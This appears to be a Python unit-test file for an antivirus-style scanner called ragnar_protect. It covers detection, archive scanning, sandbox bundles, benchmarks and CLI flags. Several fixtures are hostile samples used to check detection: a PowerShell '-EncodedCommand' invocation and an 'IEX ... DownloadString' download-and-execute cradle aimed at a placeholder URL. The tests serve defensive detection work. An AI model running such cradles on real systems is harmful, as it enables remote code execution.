from __future__ import annotations

import os
import tempfile
import unittest
import zipfile
from argparse import Namespace
from pathlib import Path
from unittest.mock import MagicMock, patch

os.environ.setdefault("RAGNAR_APP_DIR", str(Path(tempfile.gettempdir()) / "ragnar-protect-tests"))

from ragnar_protect import cli
from ragnar_protect.benchmark import BenchmarkRunner
from ragnar_protect.config import PACKAGE_ROOT, is_managed_path
from ragnar_protect.database import Database
from ragnar_protect.executable_report import ExecutableFolderReport
from ragnar_protect.scanner import RagnarScanner
from ragnar_protect.startup_manager import build_launch_command


class ScannerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db = Database(Path(self.temp_dir.name) / "test.db")
        self.scanner = RagnarScanner(self.db)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_encoded_command_detection(self) -> None:
        sample = Path(self.temp_dir.name) / "sample.ps1"
        sample.write_text("powershell.exe -EncodedCommand SQBFAFgA", encoding="utf-8")
        result = self.scanner.scan_file(sample)
        self.assertIn(result.status, {"suspicious", "malicious"})
        self.assertTrue(any(item.kind == "powershell_encoded_command" for item in result.findings))

    def test_archive_child_detection(self) -> None:
        archive_path = Path(self.temp_dir.name) / "payload.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("loader.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://example')")
        result = self.scanner.scan_file(archive_path)
        self.assertIn(result.status, {"suspicious", "malicious"})
        self.assertTrue(any(item.kind.startswith("archive_") for item in result.findings))

    def test_process_artifact_detection(self) -> None:
        result = self.scanner.scan_artifact(
            "process://1234/powershell.exe",
            "powershell.exe -EncodedCommand SQBFAFgA",
            extension=".cmdline",
            metadata={"artifact_type": "process"},
            persist=False,
        )
        self.assertEqual(result.quarantined_path, None)
        self.assertIn(result.status, {"suspicious", "malicious"})
        self.assertTrue(any(item.kind == "powershell_encoded_command" for item in result.findings))

    def test_executable_folder_report_outputs_reports(self) -> None:
        exe_dir = Path(self.temp_dir.name) / "executables"
        exe_dir.mkdir()
        sample = exe_dir / "tool.exe"
        sample.write_text("placeholder executable content", encoding="utf-8")
        report_builder = ExecutableFolderReport(self.scanner)

        with patch(
            "ragnar_protect.scanner.get_signature_status",
            return_value={
                "status": "Valid",
                "status_message": "",
                "signer_subject": "CN=Microsoft Corporation",
                "signer_issuer": "CN=Test CA",
                "thumbprint": "ABC123",
            },
        ):
            report = report_builder.scan_directory(exe_dir)

        self.assertEqual(report["file_count"], 1)
        self.assertTrue(Path(report["report_paths"]["json"]).exists())
        self.assertTrue(Path(report["report_paths"]["markdown"]).exists())
        self.assertIn("reputation", report["results"][0]["metadata"])

    def test_prepare_executable_sandbox_bundle(self) -> None:
        sample = Path(self.temp_dir.name) / "sandboxed.exe"
        sample.write_text("placeholder executable content", encoding="utf-8")
        bundle = self.scanner.prepare_executable_sandbox(sample)
        self.assertTrue(Path(bundle["config_path"]).exists())
        self.assertTrue(Path(bundle["launcher_path"]).exists())
        self.assertTrue(Path(bundle["sample_copy_path"]).exists())

    def test_startup_launch_command_targets_background_protection(self) -> None:
        command = build_launch_command()
        self.assertIn("--protect", command)
        self.assertIn("--nogui", command)

    def test_benchmark_runner_outputs_reports(self) -> None:
        corpus = Path(self.temp_dir.name) / "corpus"
        (corpus / "clean").mkdir(parents=True)
        (corpus / "malicious").mkdir(parents=True)
        (corpus / "ransomware").mkdir(parents=True)
        (corpus / "clean" / "note.txt").write_text("hello world", encoding="utf-8")
        (corpus / "malicious" / "loader.ps1").write_text("powershell.exe -EncodedCommand SQBFAFgA", encoding="utf-8")
        (corpus / "ransomware" / "readme.txt").write_text("your files have been encrypted", encoding="utf-8")

        runner = BenchmarkRunner(self.scanner, self.db)
        report = runner.run(corpus)

        self.assertTrue(Path(report.report_paths["json"]).exists())
        self.assertTrue(Path(report.report_paths["markdown"]).exists())
        self.assertGreaterEqual(report.detection_coverage, 50.0)

    def test_managed_path_recognizes_project_root(self) -> None:
        self.assertTrue(is_managed_path(PACKAGE_ROOT / "main.py"))

    def test_managed_path_recognizes_ragnar_pyinstaller_mei_bundle(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            bundle_root = Path(temp_dir) / "_MEI99999"
            (bundle_root / "native_helper").mkdir(parents=True)
            bundle_file = bundle_root / "python3.dll"
            bundle_file.write_text("placeholder", encoding="utf-8")
            self.assertTrue(is_managed_path(bundle_file))

    def test_managed_path_recognizes_legacy_ragnar_temp_sandbox(self) -> None:
        legacy_path = Path(tempfile.gettempdir()) / "ragnar-native-sandbox" / "sample" / "work" / "evil.exe"
        self.assertTrue(is_managed_path(legacy_path))

    def test_default_launch_opens_gui_when_no_cli_action_is_present(self) -> None:
        args = Namespace(
            scan=None,
            scan_executables=None,
            prepare_exe_sandbox=None,
            launch_exe_sandbox=None,
            protect=False,
            gui=False,
            allow_reduced_mode=False,
            install_startup=False,
            remove_startup=False,
            quick_scan=False,
            system_audit=False,
            cloud_status=False,
            protection_status=False,
            error_report_status=False,
            check_updates=False,
            update_status=False,
            list_quarantine=False,
            restore_quarantine=None,
            benchmark=None,
            monitor_seconds=0,
            nogui=False,
        )
        self.assertTrue(cli._should_launch_gui(args))

    def test_nogui_disables_default_gui_launch(self) -> None:
        args = Namespace(
            scan=None,
            scan_executables=None,
            prepare_exe_sandbox=None,
            launch_exe_sandbox=None,
            protect=False,
            boot_preflight=False,
            gui=False,
            allow_reduced_mode=False,
            install_startup=False,
            remove_startup=False,
            quick_scan=False,
            system_audit=False,
            cloud_status=False,
            protection_status=False,
            error_report_status=False,
            check_updates=False,
            update_status=False,
            list_quarantine=False,
            restore_quarantine=None,
            benchmark=None,
            monitor_seconds=0,
            nogui=True,
        )
        self.assertFalse(cli._should_launch_gui(args))

    def test_protect_allow_reduced_mode_skips_admin_relaunch(self) -> None:
        args = Namespace(
            scan=None,
            scan_executables=None,
            prepare_exe_sandbox=None,
            launch_exe_sandbox=None,
            protect=True,
            boot_preflight=False,
            gui=False,
            allow_reduced_mode=True,
            install_startup=False,
            remove_startup=False,
            quick_scan=False,
            system_audit=False,
            cloud_status=False,
            protection_status=False,
            error_report_status=False,
            check_updates=False,
            update_status=False,
            list_quarantine=False,
            restore_quarantine=None,
            benchmark=None,
            monitor_seconds=0,
            nogui=True,
        )
        parser = MagicMock()
        parser.parse_args.return_value = args
        engine = MagicMock()
        with patch.object(cli, "build_parser", return_value=parser), patch.object(
            cli,
            "RagnarProtectEngine",
            return_value=engine,
        ), patch.object(cli, "is_admin", return_value=False), patch.object(
            cli,
            "relaunch_as_admin",
        ) as relaunch_mock, patch.object(
            cli,
            "register_background_worker",
        ) as register_mock, patch.object(
            cli,
            "ensure_watchdog_worker",
        ) as ensure_watchdog_mock, patch.object(
            cli,
            "unregister_background_worker",
        ) as unregister_mock, patch.object(
            cli.time,
            "sleep",
            side_effect=KeyboardInterrupt,
        ):
            exit_code = cli.main()

        self.assertEqual(exit_code, 0)
        relaunch_mock.assert_not_called()
        register_mock.assert_called_once_with(reduced_mode=True)
        ensure_watchdog_mock.assert_called_once_with()
        engine.start_protection.assert_called_once_with(reduced_mode=True)
        unregister_mock.assert_called_once()

    def test_boot_preflight_counts_as_explicit_action(self) -> None:
        args = Namespace(
            scan=None,
            scan_executables=None,
            prepare_exe_sandbox=None,
            launch_exe_sandbox=None,
            protect=False,
            boot_preflight=True,
            gui=False,
            allow_reduced_mode=False,
            install_startup=False,
            remove_startup=False,
            quick_scan=False,
            system_audit=False,
            cloud_status=False,
            protection_status=False,
            error_report_status=False,
            check_updates=False,
            update_status=False,
            list_quarantine=False,
            restore_quarantine=None,
            benchmark=None,
            monitor_seconds=0,
            nogui=False,
        )
        self.assertFalse(cli._should_launch_gui(args))


if __name__ == "__main__":
    unittest.main()
